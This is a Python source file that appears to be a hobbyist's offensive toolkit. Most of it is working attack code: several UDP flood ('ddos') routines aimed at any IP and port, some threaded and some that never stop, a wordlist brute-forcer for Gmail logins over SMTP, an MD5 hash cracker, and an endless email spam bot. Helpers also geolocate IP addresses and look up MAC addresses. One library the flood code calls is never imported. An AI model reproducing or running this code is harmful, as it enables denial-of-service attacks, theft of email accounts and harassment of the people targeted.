# This was before I properly knew how to use classes(you can see improper and unecessary usage).
import socket
import time
import math
import random
import os
import os
import threading
import hashlib
import smtplib
import time
try:
    import getmac
    import geocoder
except:
    os.system('pip install getmac')
    os.system('pip install geocoder')
class getip:
    def ipv4(self, hostname):
        hostname = socket.gethostbyname(hostname)
        return hostname
    def ipv6(self, hostname):
        hostname = socket.getaddrinfo(hostname, 8080, socket.AF_INET6)
        return hostname
    def ipv4info(self, hostname):
        hostname = socket.getaddrinfo(hostname, 8080, socket.AF_INET)
        return hostname
    def domainIP(self, hostname):
        hostname = socket.gethostbyname(hostname)
        return hostname
    def deviceInfo(self, IP):
        info = socket.gethostbyaddr(IP)
        return info
def strtohash(string):
    enc_word = string.encode()
    digest = hashlib.md5(enc_word).hexdigest()
    return digest
def hashtostr(hash, filename):
    file = open(filename, 'r')
    success = False
    try:
        for word in file:
            print("[+] Guess:", word.strip())
            enc_word = word.encode()
            digest = hashlib.md5(enc_word.strip()).hexdigest()
            print("[+] Hash of word:", digest.strip())
            if digest.strip() == hash.strip():
                print("[+] Passwords has been found.")
                print("[+] Password is:", word)
                print("")
                success = True
                break
            else:
                print("[+] Guess incorrect.")
                print("")
    except:
        pass
    if not success:
        print("[+] Unable to find the translation.")
def dictionaryattack(email, filename):
    gmail = smtplib.SMTP('smtp.gmail.com', 587)
    gmail.starttls()
    gmail.ehlo()
    file = open(filename, 'r')
    for password in file:
        try:
            password = password.strip()
            print("[+] Guess for password:", password)
            gmail.login(email, password)
            print("[+] Success.")
            print("[+] Password is:", password)
            print("")
            break
        except:
            print("[+] Password", password, "is incorrect.")
            print("")
def getmacaddress(hostname):
    mac_address = getmac.get_mac_address(hostname)
    return mac_address
packet = random._urandom(1490)
sent = 0
request_sent = 0
class ddos:
    def regular(IP, port, attack_count, delay):
        ip = socket.gethostbyname(IP)
        try:
            print("[+] Preparing Attack for IP:", ip)
            ms = pythonping.ping(ip)
            ms = ms.rtt_avg_ms
            print("[+] Ping of Server:", ms)
        except:
            pass
        time.sleep(1)
        prevcount = 0
        print("")
        sent = 0
        request_sent = 0

        def attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((ip, port))
            sock.sendto(packet, (ip, port))
            sock.close()
            global request_sent
            request_sent += 1
            print(f"[+] DDoS Attack {port} Port - IP: {ip} - {request_sent} Requests Sent")
            if request_sent >= attack_count:
                ms = pythonping.ping(ip)
                ms = ms.rtt_avg_ms
                print("[+] DDoS Attack Done")
                print("[+] Ping of Server:", ms)
                quit()

        while True:
            if sent >= attack_count:
                break
                quit()
            for i in range(attack_count):
                x = threading.Thread(target=attack)
                x.start()
                sent += 1
                if sent >= attack_count:
                    break
                    quit()
                time.sleep(delay)  # for some safetly lol

    def clean(IP, port, attack_count, delay):
        ip = socket.gethostbyname(IP)
        try:
            print("[+] Preparing Attack for IP:", ip)
            ms = pythonping.ping(ip)
            ms = ms.rtt_avg_ms
            print("[+] Ping of Server:", ms)
        except:
            pass
        time.sleep(1)
        prevcount = 0
        print("")
        sent = 0
        request_sent = 0
        for i in range(attack_count):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((ip, port))
            sock.sendto(packet, (ip, port))
            sock.close()
            sent += 1
            print(f"[+] DDoS Attack {port} Port - IP: {ip} - {sent} Requests Sent")
            if sent >= attack_count:
                ms = pythonping.ping(ip)
                ms = ms.rtt_avg_ms
                print("[+] DDoS Attack Done")
                print("[+] Ping of Server:", ms)
                quit()
            time.sleep(delay)  # for some safetly lol

    def nonstop(IP, port):
        ip = socket.gethostbyname(IP)
        try:
            print("[+] Preparing Attack for IP:", ip)
        except:
            pass
        print("")
        sent = 0
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((ip, port))
            sock.sendto(packet, (ip, port))
            sent += 1
            print(f"[+] DDoS Attack {port} Port - IP: {ip} - {sent} Requests Sent")
    def nonstop2(IP, port):
        ip = socket.gethostbyname(IP)
        try:
            print("[+] Preparing Attack for IP:", ip)
        except:
            pass
        time.sleep(1)
        prevcount = 0
        print("")
        sent = 0
        request_sent = 0

        def attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((ip, port))
            sock.sendto(packet, (ip, port))
            sock.close()
            global request_sent
            request_sent += 1
            print(f"[+] DDoS Attack {port} Port - IP: {ip} - {request_sent} Requests Sent")

        while True:
            x = threading.Thread(target=attack)
            x.start()
            sent += 1
class trackIP:
    def latlng(IP):
        IP = socket.gethostbyname(IP)
        IP = geocoder.ip(IP)
        location = IP.latlng
        return location
    def location_info(IP):
        IP = socket.gethostbyname(IP)
        IP = geocoder.ip(IP)
        location = IP.geojson
        return location
def emailSpamBot(email_sendto, password, email_recieve, subject, msg):
    sent = 0
    gmail = smtplib.SMTP('smtp.gmail.com', 587)
    gmail.starttls()
    gmail.ehlo()
    gmail.login(email_sendto, password)
    content = "Subject: "+subject+f"{str(sent)}"+"\n\n" + msg
    while True:
        try:
            sent += 1
            content = "Subject: " + subject + f"{str(sent)}" + "\n\n" + msg
            gmail.sendmail(from_addr=email_sendto, to_addrs=email_recieve, msg=content)
            print("[+] Email has been sent to addr:", email_recieve)
        except:
            print("[+] Connecting most likely refused by server.")
            print("[+] Wating 30 seconds......")
            time.sleep(30)
            gmail = smtplib.SMTP('smtp.gmail.com', 587)
            gmail.starttls()
            gmail.ehlo()
            gmail.login(email_sendto, password)
